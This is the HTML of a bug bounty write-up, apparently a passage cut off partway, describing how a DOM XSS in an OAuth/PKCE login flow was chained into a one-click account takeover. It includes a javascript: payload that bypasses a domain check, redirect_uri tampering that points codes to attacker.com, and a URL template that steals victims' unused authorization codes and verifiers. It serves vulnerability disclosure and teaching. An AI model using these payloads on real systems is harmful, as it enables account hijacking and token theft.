@@ -1,0 +1,614 @@
+<!DOCTYPE html><html lang="en"><head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    <meta name="description" content="I. IntroductionToday Frog Sec Team will dive into a fascinating case study where we escalated a seemingly simple DOM XSS into a sophisticated 1-click Account Takeover.  This attack allows the attacker">
+<meta property="og:type" content="article">
+<meta property="og:title" content="How we escalated a DOM XSS to a sophisticated 1-click Account Takeover for $8000">
+<meta property="og:url" content="https://frogsec.github.io/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/index.html">
+<meta property="og:site_name" content="FrogSec's Research Blog">
+<meta property="og:description" content="I. IntroductionToday Frog Sec Team will dive into a fascinating case study where we escalated a seemingly simple DOM XSS into a sophisticated 1-click Account Takeover.  This attack allows the attacker">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://frogsec.github.io/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/Untitled.png">
+<meta property="og:image" content="https://frogsec.github.io/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/Untitled%201.png">
+<meta property="og:image" content="https://frogsec.github.io/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/Untitled%202.png">
+<meta property="og:image" content="https://frogsec.github.io/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/Untitled%203.png">
+<meta property="og:image" content="https://frogsec.github.io/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/Untitled%204.png">
+<meta property="og:image" content="https://frogsec.github.io/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/Untitled%205.png">
+<meta property="og:image" content="https://frogsec.github.io/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/Untitled%206.png">
+<meta property="og:image" content="https://frogsec.github.io/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/Untitled%207.png">
+<meta property="og:image" content="https://frogsec.github.io/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/Untitled%201.png">
+<meta property="og:image" content="https://frogsec.github.io/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/Untitled%208a.png">
+<meta property="og:image" content="https://frogsec.github.io/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/Untitled%208b.png">
+<meta property="og:image" content="https://frogsec.github.io/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/Untitled%209.png">
+<meta property="og:image" content="https://frogsec.github.io/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/Untitled%2010.png">
+<meta property="og:image" content="https://frogsec.github.io/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/Untitled%2011.png">
+<meta property="article:published_time" content="2024-03-27T15:37:17.000Z">
+<meta property="article:modified_time" content="2024-03-28T04:46:38.916Z">
+<meta property="article:author" content="Benasin, LongTheShrimp, K0m3g4">
+<meta property="article:tag" content="bugbounty">
+<meta property="article:tag" content="dom-xss">
+<meta property="article:tag" content="xss">
+<meta property="article:tag" content="client-side">
+<meta property="article:tag" content="ato">
+<meta property="article:tag" content="oauth2">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://frogsec.github.io/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/Untitled.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>How we escalated a DOM XSS to a sophisticated 1-click Account Takeover for $8000</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Posts</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/benasin">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://frogsec.github.io/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://frogsec.github.io/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/&amp;text=How we escalated a DOM XSS to a sophisticated 1-click Account Takeover for $8000"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://frogsec.github.io/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/&amp;title=How we escalated a DOM XSS to a sophisticated 1-click Account Takeover for $8000"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://frogsec.github.io/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/&amp;is_video=false&amp;description=How we escalated a DOM XSS to a sophisticated 1-click Account Takeover for $8000"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=How we escalated a DOM XSS to a sophisticated 1-click Account Takeover for $8000&amp;body=Check out this article: https://frogsec.github.io/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://frogsec.github.io/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/&amp;title=How we escalated a DOM XSS to a sophisticated 1-click Account Takeover for $8000"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://frogsec.github.io/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/&amp;title=How we escalated a DOM XSS to a sophisticated 1-click Account Takeover for $8000"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://frogsec.github.io/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/&amp;title=How we escalated a DOM XSS to a sophisticated 1-click Account Takeover for $8000"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://frogsec.github.io/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/&amp;title=How we escalated a DOM XSS to a sophisticated 1-click Account Takeover for $8000"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://frogsec.github.io/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/&amp;name=How we escalated a DOM XSS to a sophisticated 1-click Account Takeover for $8000&amp;description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://frogsec.github.io/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/&amp;t=How we escalated a DOM XSS to a sophisticated 1-click Account Takeover for $8000"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#I-Introduction"><span class="toc-number">1.</span> <span class="toc-text">I. Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#II-Our-discovery"><span class="toc-number">2.</span> <span class="toc-text">II. Our discovery</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Investigating-the-login-flow-of-the-application-%F0%9F%91%80"><span class="toc-number">2.1.</span> <span class="toc-text">1. Investigating the login flow of the application 👀</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Trying-out-the-text-book-OAuth-attack"><span class="toc-number">2.2.</span> <span class="toc-text">2. Trying out the text-book OAuth attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Finding-the-DOM-XSS"><span class="toc-number">2.3.</span> <span class="toc-text">3. Finding the DOM XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-First-attempt-on-performing-the-ATO"><span class="toc-number">2.4.</span> <span class="toc-text">3. First attempt on performing the ATO</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-How-we-overcome-the-1-time-code-issue"><span class="toc-number">2.5.</span> <span class="toc-text">4. How we overcome the 1-time code issue</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Escalate-escalate-escalate-%E2%80%A6-to-one-click-mail-ATO"><span class="toc-number">2.6.</span> <span class="toc-text">5. Escalate, escalate, escalate, … to one-click mail ATO</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#III-Conclusion"><span class="toc-number">3.</span> <span class="toc-text">III. Conclusion</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        How we escalated a DOM XSS to a sophisticated 1-click Account Takeover for $8000
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Benasin, LongTheShrimp</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-03-27T15:37:17.000Z" class="dt-published" itemprop="datePublished">2024-03-27</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/ato/" rel="tag">ato</a>, <a class="p-category" href="/tags/bugbounty/" rel="tag">bugbounty</a>, <a class="p-category" href="/tags/client-side/" rel="tag">client-side</a>, <a class="p-category" href="/tags/dom-xss/" rel="tag">dom-xss</a>, <a class="p-category" href="/tags/oauth2/" rel="tag">oauth2</a>, <a class="p-category" href="/tags/xss/" rel="tag">xss</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="I-Introduction"><a href="#I-Introduction" class="headerlink" title="I. Introduction"></a>I. Introduction</h2><p>Today Frog Sec Team will dive into a fascinating case study where we escalated a seemingly simple DOM XSS into a sophisticated 1-click Account Takeover. </p>
+<p>This attack allows the attacker to send a legitimate login link from the application’s email. When the victims (whether unauthenticated or authenticated) clicks on the link from their email, the attacker will be able to compromised the accounts.</p>
+<p>We will take you through our thought process, the obstacles we encountered, and how we overcame them to execute this full chain exploit.</p>
+<p>Let’s goooo 😤😤😤</p>
+<h2 id="II-Our-discovery"><a href="#II-Our-discovery" class="headerlink" title="II. Our discovery"></a>II. Our discovery</h2><p>It would have been impossible to find this vulnerability if we hadn’t understood deeply about the underlying architecture and potential attack vectors of the system.<br>Let’s first have a clear understanding of the target.</p>
+<p>We will refer the target as <code>account.redacted.com</code> and their partner sites as <code>account.partner.com</code> because we didn’t have the permission to disclose the program’s name. </p>
+<h3 id="1-Investigating-the-login-flow-of-the-application-👀"><a href="#1-Investigating-the-login-flow-of-the-application-👀" class="headerlink" title="1. Investigating the login flow of the application 👀"></a>1. Investigating the login flow of the application 👀</h3><p>Out of all functionalities, we chose to test for the login flow first because this might be where the High/Critical vulnerabilities is hidden from plain sight.</p>
+<p><code>account.redacted.com</code> will have a Single Sign On (SSO) portal where other partner sites will integrate this portal to log the users in their services. </p>
+<p>Here is the sequence diagram of the complete flow:</p>
+
+    <div>
+      <img src="/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/Untitled.png" alt="" data-action="zoom" class="photozoom">
+      
+    </div>
+
+<ol>
+<li>The user will click login to <code>account.partner.com</code></li>
+</ol>
+<p>2,3. <code>account.partner.com</code> will generate and return the <code>code_verifier</code> through the <code>bfe-pkce-2020</code> cookie and redirect the browser to <code>https://account.redacted.com/authorize</code> with the <code>redirect_uri</code> parameter</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/2 302 Found</span><br><span class="line">Set-Cookie: bfe-pkce-2020=&lt;code_verifier&gt;; Path=/; Expires=Tue, 26 Mar 2024 11:25:07 GMT</span><br><span class="line">Location: https://account.redacted.com/authorize?redirect_uri=https%3A%2F%2Faccount.partner.com%2Foauth_callback%3Fnext%3D%2Fabc&amp;response_type=code&amp;code_challenge=&lt;code_challenge&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<ul>
+<li>Particularly, this <code>redirect_uri</code> is</li>
+</ul>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://account.partner.com/oauth_callback?next=/abc</span><br></pre></td></tr></tbody></table></figure>
+
+<ul>
+<li>If you wonder what is <code>code_verifier</code>, according to <a target="_blank" rel="noopener" href="https://auth0.com/docs/get-started/authentication-and-authorization-flow/authorization-code-flow-with-pkce">auth0.com</a></li>
+</ul>
+<blockquote>
+<p>The&nbsp;PKCE-enhanced Authorization Code Flow&nbsp;introduces a secret created by the calling application that can be verified by the&nbsp;authorization server; this secret is called the Code Verifier. Additionally, the calling app creates a transform value of the Code Verifier called the Code Challenge and sends this value over HTTPS to retrieve an Authorization Code. This way, a malicious attacker can only intercept the Authorization Code, and they cannot exchange it for a token without the Code Verifier.</p>
+</blockquote>
+<ul>
+<li>So basically, <code>code_verifier</code> is an additional layer to protect the <code>Authorization Code</code>, in order to exchange for the access token, we also need the <code>code_verifier</code> associated with that <code>authorization_code</code></li>
+</ul>
+<p>4,5. User will be prompted a login page at the <code>account.redacted.com</code> SSO Portal, or redirected if already logged in.</p>
+<ol start="6">
+<li><p>The <code>redirect_url</code> will be formed by concatenating the <code>authorization_code</code> after the previously supplied <code>redirect_uri</code></p>
+ <figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect_url = redirect_uri + <span class="string">"&lt;authorization_code&gt;"</span></span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><p>Then, the browser will be redirected to the <code>redirect_url</code></p>
+</li>
+<li><p>Next <code>account.partner.com</code> will be able to get the authorization code through the redirection from <code>account.redacted.com</code>. </p>
+<ul>
+<li><p>The redirection URL will look something like this:</p>
+  <figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://account.partner.com/oauth_callback?next=/abc&amp;code=&lt;authorization_code&gt; </span><br></pre></td></tr></tbody></table></figure>
+<ul>
+<li><code>next</code>: is the URL to be redirected after the <code>authorization_code</code> is used and verified successfully</li>
+<li><code>code</code>: is where the application will get the <code>authorization_code</code></li>
+</ul>
+</li>
+<li><p>The front end Javascript will then use the <code>code</code> to exchange for the access token at <code>POST / access_token</code></p>
+  <figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /access_token HTTP/2</span><br><span class="line">Host: account.partner.com</span><br><span class="line">Cookie: bfe-pkce-2020=&lt;code_verifier&gt;</span><br><span class="line">Content-Length: 306</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">code=&lt;authorization_code&gt;&amp;grantType=authorization_code&amp;redirect_url=&lt;redirect_url&gt;</span><br></pre></td></tr></tbody></table></figure></li>
+</ul>
+</li>
+<li><p>Notice that the <code>code_verifier</code> must be associated with the <code>authorization_code</code> in order for the exchange of access token to be successful.</p>
+<p>If the <code>code_verifier</code> and <code>authorization_code</code> are valid, the access token will be returned and set as the cookie.</p>
+ <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP/2 201 Created</span><br><span class="line">Set-Cookie: accessToken=na3+CYtH7TAt+kjebEZgjJ4m37V8Qkxb+GhMw1FlU7gnELDBevy3qGJADAsNfBKSjoujZhgILLU+M8n49DrRd8+yZS1Jco2M04KWqbp64B8ASHPM6llTqZc=; Domain=partner.com</span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><p>Finally, the application will redirect the page to the URL at the <code>next</code> parameter of the <code>oauth_callback</code> endpoint from step 3, which is redirecting to <code>https://account.partner.com/abc</code></p>
+</li>
+</ol>
+<h3 id="2-Trying-out-the-text-book-OAuth-attack"><a href="#2-Trying-out-the-text-book-OAuth-attack" class="headerlink" title="2. Trying out the text-book OAuth attack"></a>2. Trying out the text-book OAuth attack</h3>
+    <div>
+      <img src="/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/Untitled%201.png" alt="" data-action="zoom" class="photozoom">
+      
+    </div>
+
+<p>Our first approach ís to tamper the <code>redirect_uri</code> parameter at step 3 of the login flow. For example:</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://account.redacted.com/authorize?redirect_uri=https://attacker.com&amp;response_type=code</span><br></pre></td></tr></tbody></table></figure>
+
+<p>We will then send this tampered link to the victim.</p>
+<p>If the login flow is successful, the code will be attached to the <code>https://attacker.com</code> domain at step 7, thus the attacker can obtain the authorization code.</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://attacker.com/?code=&lt;authorization_code&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>However, things aren’t that easy ¯\<em>(ツ)</em>/¯</p>
+<p>The application would reject any <code>redirect_uri</code> which isn’t having the domain name <a target="_blank" rel="noopener" href="http://account.partner.com/">account.partner.com</a> and only accepts <code>http</code> and <code>https</code> protocol. </p>
+<p>Fortunately, we can still modify the URL path to anything we want. For example:</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://account.redacted.com/authorize?redirect_uri=https://account.partner.com/&lt;anything_here&gt;&amp;response_type=code</span><br></pre></td></tr></tbody></table></figure>
+
+<p>Another way to exploit this is to find an Open Redirect on <code>https://account.partner.com</code> so we can redirect the authorization code to our server.</p>
+<p>In step 10 of the login flow, we have mentioned that there is another redirect at <code>https://account.partner.com/oauth_callback?next=</code> </p>
+<p>One interesting thing is there isn’t any <code>302</code> or redirecting status code from the server, indicating that the application is being redirected using JavaScript.</p>
+<p>Let’s examine the redirect sink!</p>
+<h3 id="3-Finding-the-DOM-XSS"><a href="#3-Finding-the-DOM-XSS" class="headerlink" title="3. Finding the DOM XSS"></a>3. Finding the DOM XSS</h3>
+    <div>
+      <img src="/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/Untitled%202.png" alt="" data-action="zoom" class="photozoom">
+      
+    </div>
+
+<p>At step 8 of the login flow, the value of <code>next</code> parameter will be placed in the destination property, where the client-side JavaScript will then use to redirect the webpage. </p>
+
+    <div>
+      <img src="/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/Untitled%203.png" alt="" data-action="zoom" class="photozoom">
+      
+    </div>
+
+
+    <div>
+      <img src="/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/Untitled%204.png" alt="" data-action="zoom" class="photozoom">
+      
+    </div>
+
+<p>As we can see, the destination URL is used at <code>href</code> sink. A typical sink for <code>javascript:</code> protocol DOM XSS.</p>
+<p>However, when trying the typical payload, we are greeted with a 500 Internal Server Error</p>
+
+    <div>
+      <img src="/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/Untitled%205.png" alt="" data-action="zoom" class="photozoom">
+      
+    </div>
+
+<p>Let’s bypass this (☞ﾟヮﾟ)☞</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Here are my attempts:</span><br><span class="line"></span><br><span class="line">javascript:alert(1) =&gt; ❌&nbsp;Does not work</span><br><span class="line"></span><br><span class="line">https://attacker.com =&gt; ❌&nbsp;Does not work</span><br><span class="line"></span><br><span class="line">https://account.partner.com/random_stuff_here =&gt; ✅ Works</span><br><span class="line"></span><br><span class="line">javascript://account.partner.com/random_stuff_here =&gt; ✅ Works</span><br><span class="line"></span><br><span class="line">javascript://account.partner.com/%0Aalert(1) =&gt; ✅ Works</span><br></pre></td></tr></tbody></table></figure>
+
+<p>So basically, the server only checks for the domain name if it is <code>account.partner.com</code> after <code>://</code> without checking the protocol.</p>
+<p>Moreover, <code>javascript://account.partner.com/%0Aalert(1)</code> is a completely valid XSS payload. </p>
+<p>In JS, <code>//</code> is treated as a line comment, so it will comment out the <code>account.partner.com</code> part and <code>%0A</code> will creates a newline where <code>alert(1)</code> will be executed.</p>
+<p>You can try this yourself on the browser console.</p>
+<figure class="highlight jsx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">"javascript://account.partner.com/%0Aalert(1)"</span></span><br></pre></td></tr></tbody></table></figure>
+
+
+    <div>
+      <img src="/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/Untitled%206.png" alt="" data-action="zoom" class="photozoom">
+      
+    </div>
+
+<p>So we now have a valid XSS payload to bypass the domain name check!</p>
+<h3 id="3-First-attempt-on-performing-the-ATO"><a href="#3-First-attempt-on-performing-the-ATO" class="headerlink" title="3. First attempt on performing the ATO"></a>3. First attempt on performing the ATO</h3><p>In order for us to perform the ATO we need to get 2 things:</p>
+<ul>
+<li>The code verifier (available in the <code>bfe-pkce-2020</code> cookie) associated with the authorization code</li>
+<li>The authorization code (available on the URL)</li>
+</ul>
+<p>We can both get these with our XSS and send them back to our attacker’s server. </p>
+<p>However, there is one catch:</p>
+<p>Our XSS on </p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://account.partner.com/oauth_callback?next=javascript://account.partner.com/%0Aalert(window.location.href)&amp;code=&lt;authorization_code&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>is only executed <strong>after</strong> the authorization code is used successfully. </p>
+
+    <div>
+      <img src="/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/Untitled%207.png" alt="" data-action="zoom" class="photozoom">
+      
+    </div>
+
+<p>As you can see, the <code>authorization_code</code> is already used and verified at step 9.</p>
+<p>Because the <code>authorization_code</code> is only allowed to use <strong>1 time only</strong>, when we try to exchange the captured <code>authorization_code</code> and <code>code_verifier</code> for the victim’s access token at <code>POST /access_token</code> the following error will occur:</p>
+<figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">{</span><span class="attr">"error"</span><span class="punctuation">:</span><span class="string">"invalid_grant"</span><span class="punctuation">,</span><span class="attr">"errorDescription"</span><span class="punctuation">:</span><span class="string">"`code` is expired"</span><span class="punctuation">}</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>We need to find some way to allow us to capture the victim’s <code>code verifier</code> and the associated <code>authorization code</code> before it is used!</p>
+<h3 id="4-How-we-overcome-the-1-time-code-issue"><a href="#4-How-we-overcome-the-1-time-code-issue" class="headerlink" title="4. How we overcome the 1-time code issue"></a>4. How we overcome the 1-time code issue</h3><ul>
+<li><p>In order to get the valid access token of the victim, we need to get their code verifier (<code>bfe-pkce-2020</code>) and the unused generated authorization code (<code>code</code>).</p>
+</li>
+<li><p>Few hours later, we came up with the idea of forcing the victim’s browser to use the <code>attacker’s authorization code</code> to trigger the XSS and steal the <code>victim’s unused authorization code</code>.</p>
+
+    <div>
+      <img src="/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/Untitled%201.png" alt="" data-action="zoom" class="photozoom">
+      
+    </div></li>
+<li><p>We will first tamper the <code>redirect_uri</code> parameter to something like this:</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://account.partner.com/oauth_callback?code=&lt;attacker_code&gt;&amp;next=javascript://account.partner.com/%0A&lt;XSS_PAYLOAD_STEAL_2nd_CODE&gt;</span><br></pre></td></tr></tbody></table></figure></li>
+<li><p>The <code>/oauth_callback</code> <strong>at step 7</strong> will look like this:</p>
+<ul>
+<li>Please notice that now there are 2 <code>code</code> params in the URL as the server will prepend the newly generated victim’s <code>authorization_code</code> to the previous supplied <code>redirect_uri</code></li>
+</ul>
+  <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://account.partner.com/oauth_callback?code=&lt;attacker_code&gt;&amp;next=javascript://account.partner.com/%0A&lt;XSS_PAYLOAD_STEAL_2nd_CODE&gt;&amp;code=&lt;victim_code&gt;</span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><p>This time the application will use the <strong>first</strong> <code>code</code> parameter in the URL and <em><code>log the victim into the Attacker’s account</code></em>.</p>
+</li>
+<li><p>After that the XSS will be triggered, sending the <strong>unused victim’s authorization code</strong> (the <strong>second</strong> <code>code</code>) to the attacker’s server.</p>
+</li>
+<li><p>The attacker can now use this unused code for exchanging the victim’s access token.</p>
+</li>
+<li><p><strong>We also need to take the <code>code_verifier</code>(<code>bfe-pkce-2020</code> cookie) into account.</strong></p>
+</li>
+<li><p>Essentially, we will force the victim into using the <strong>attacker’s authorization_code</strong> and the <strong>code_verifier</strong> for logging in, then we will steal their <strong>unused authorization_code</strong> and <strong>code_verifier</strong>.</p>
+</li>
+<li><p>The flow will look like this:</p>
+  
+    <div>
+      <img src="/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/Untitled%208a.png" alt="" data-action="zoom" class="photozoom">
+      
+    </div>
+  
+    <div>
